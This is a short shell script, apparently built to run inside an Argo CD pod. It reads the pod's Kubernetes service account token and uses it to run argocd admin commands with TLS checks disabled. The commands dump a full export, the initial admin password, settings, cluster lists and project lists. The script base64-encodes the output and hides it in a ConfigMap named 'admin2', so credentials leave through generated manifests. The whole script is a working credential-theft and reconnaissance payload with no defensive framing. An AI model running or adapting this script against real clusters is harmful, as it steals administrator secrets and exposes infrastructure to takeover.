#!/bin/sh
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}"

RECON=$( (
  echo "===ADMIN_EXPORT_WITH_SERVER==="
  /usr/local/bin/argocd admin export --server "$APISERVER" --token "$TOKEN" --insecure-skip-tls-verify -n argocd 2>&1 | head -150

  echo ""
  echo "===ADMIN_INITIAL_PASSWORD_WITH_SERVER==="
  /usr/local/bin/argocd admin initial-password --server "$APISERVER" --token "$TOKEN" --insecure-skip-tls-verify -n argocd 2>&1

  echo ""
  echo "===ADMIN_SETTINGS_VALIDATE==="
  /usr/local/bin/argocd admin settings validate --server "$APISERVER" --token "$TOKEN" --insecure-skip-tls-verify -n argocd --load-cluster-settings 2>&1 | head -50

  echo ""
  echo "===ADMIN_CLUSTER_LIST==="
  /usr/local/bin/argocd admin cluster list --server "$APISERVER" --token "$TOKEN" --insecure-skip-tls-verify -n argocd 2>&1 | head -30

  echo ""
  echo "===ADMIN_PROJ_LIST==="
  /usr/local/bin/argocd admin proj list --server "$APISERVER" --token "$TOKEN" --insecure-skip-tls-verify -n argocd 2>&1 | head -30
) | base64 | tr -d '\n' )
cat << EOF
apiVersion: v1
kind: ConfigMap
metadata:
  name: admin2
data:
  result: $RECON
EOF
exit 0